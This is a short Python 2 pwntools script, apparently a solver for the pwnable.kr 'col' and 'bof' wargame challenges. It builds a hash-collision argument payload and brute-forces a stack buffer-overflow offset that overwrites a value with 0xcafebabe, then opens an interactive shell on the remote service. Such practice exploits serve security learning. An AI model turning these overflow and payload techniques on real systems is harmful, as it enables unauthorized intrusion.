#!/usr/bin/python
import random
import sys
import os
import time
import threading
import struct
from time import time
from pwn import *

# Base for any of my ROPs.
def db(v):
  return struct.pack("<B", v)

def dw(v):
  return struct.pack("<H", v)

def dd(v):
  return struct.pack("<I", v)

def dq(v):
  return struct.pack("<Q", v)

def rb(v):
  return struct.unpack("<B", v[0])[0]

def rw(v):
  return struct.unpack("<H", v[:2])[0]

def rd(v):
  return struct.unpack("<I", v[:4])[0]

def rq(v):
  return struct.unpack("<Q", v[:8])[0]



def f_local():
    payload = dd(0x01010101) * 4
    payload += dd(0x1DD905E8)

    arguments = ['./col', payload]
    print arguments
    t = process(argv=arguments)
    rcv = t.recvall()
    print rcv

def f_remote():
    host = 'pwnable.kr'
    port = 9000

    for i in xrange(32, 100, 4):
        r = remote(host, port)
        r.sendline('a' * i + dd(0xcafebabe))
        resp = r.recv(1024, timeout=1)
        if resp == '':
            print("Hit offset: " + str(i))
            r.interactive()
        else:
            print("Offset " + str(i) + " failed")
            r.close()


f_remote()
